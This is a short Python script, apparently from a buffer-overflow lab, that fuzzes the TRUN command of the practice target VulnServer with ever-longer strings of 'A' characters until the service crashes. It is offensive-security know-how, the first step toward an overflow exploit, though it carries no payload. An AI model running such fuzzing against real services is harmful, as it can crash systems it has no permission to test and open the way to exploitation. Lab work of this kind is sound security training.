#!/usr/bin/python3
# Carlos Enamorado
# 10/17/2023
# Fuzzer for VulnServer TRUN Command

'''
The purpose of this script is to fuzz a service running on 'VictimIP' on port `9999` with an ever-increasing buffer of "A" characters. 
The script will loop indefinitely, increasing the buffer size by 100 "A" characters with each iteration, until the service crashes. 
When that happens, the script will report the size of the buffer at which the service crashed and then exit.
'''

import sys, socket # Requird modules for  functionality between system and network connection protocols
from time import sleep # Time module used to leverage sleep fucntion to introducee delays

buffer = "A" * 100

while True:
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates a new socket object 's'; Speciffies IPv4 based socket using TCP protocol or Port
                s.connect(('<VictimIP>',9999)) # Change VictimIP and Default Vulnserver Port (if needed)

                payload = "TRUN /.:/" + buffer # Reference Immunity Debugger for '/.:/'; This is taken in after ENTER

                s.send((payload.encode())) # Send encoded payload TRUN + buffer
                s.close() # Close connection
                sleep(1)
                buffer = buffer + "A"*100
        except:
                print ("Fuzzing crashed at %s bytes" % str(len(buffer))) # Prints a message indicating the length of the buffer when the program encounters an error
                sys.exit()

  
